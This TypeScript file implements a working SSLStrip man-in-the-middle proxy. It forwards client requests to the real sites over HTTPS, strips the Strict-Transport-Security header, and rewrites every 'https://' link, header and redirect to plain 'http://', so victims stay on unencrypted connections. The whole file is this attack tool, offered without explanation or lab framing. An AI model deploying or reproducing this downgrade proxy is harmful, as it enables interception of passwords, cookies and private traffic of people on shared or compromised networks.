import * as http from "http";
import * as https from "https";
import * as zlib from "zlib";

const onRequest = (req: http.IncomingMessage, res: http.ServerResponse) => {
    console.log(`[server] got request, need to serve: ${req.headers.host}${req.url}`);

    const requestURL = new URL(req.url, `http://${req.headers.host}`);
    req.headers["Accept-Encoding"] = "identity";
    const options = {
        host: requestURL.host,
        port: 443,
        path: requestURL.pathname,
        method: req.method,
        headers: req.headers
    };

    const proxy = https.request(options, (requestRes: http.IncomingMessage) => {
        console.log(`[proxy] proxy request got response, writing back to client...`);
        let newHeaders = requestRes.headers;
        if ("strict-transport-security" in newHeaders) {
            delete newHeaders["strict-transport-security"];
        }
        if ("content-type" in newHeaders && newHeaders['content-type'].substr(0, 9) == 'text/html') {
            for (let header in newHeaders) {
                if (newHeaders[header] instanceof Array) {
                    newHeaders[header] = (<Array<string>> newHeaders[header]).map(i => i.replaceAll("https://", "http://"))
                } else {
                    newHeaders[header] = (<string>newHeaders[header]).replaceAll("https://", "http://");
                }
            }

            const bodyChunks = new Array<Buffer>;
            requestRes.on("data", (chunk: Buffer) => {
                bodyChunks.push(chunk);
            });

            requestRes.on("end", () => {
                const newBody = Buffer.concat(bodyChunks).toString().replaceAll("https://", "http://");
                zlib.gzip(newBody, (error: Error, result: Buffer) => {
                    if (error != null) {
                        res.writeHead(500, { 'Content-Type': 'application/json' })
                           .end(JSON.stringify({ message: "internal server error" }));
                        return;
                    }
                    newHeaders["content-length"] = Buffer.byteLength(result).toString();
                    newHeaders["content-encoding"] = "gzip";
                    // write headers
                    res.writeHead(requestRes.statusCode, newHeaders);
                    // write body
                    res.end(result);
                });
            });
        } else {
            if (requestRes.statusCode === 302 || requestRes.statusCode === 301) {
                newHeaders["location"] = newHeaders["location"].replaceAll("https://", "http://");
            }
            res.writeHead(requestRes.statusCode, newHeaders);
            requestRes.pipe(res, { end: true });
        }
    });

    proxy.on('error', (e: Error) => {
        console.log(`[server] error in proxying request: ${e}`);
        res.writeHead(500, { 'Content-Type': 'application/json' })
           .end(JSON.stringify({ message: "internal server error" }));
    });

    req.pipe(proxy, {
        end: true
    });
}

http.createServer(onRequest).listen(8080, () => {
    console.log(`[server] SSLStrip server started`);
});
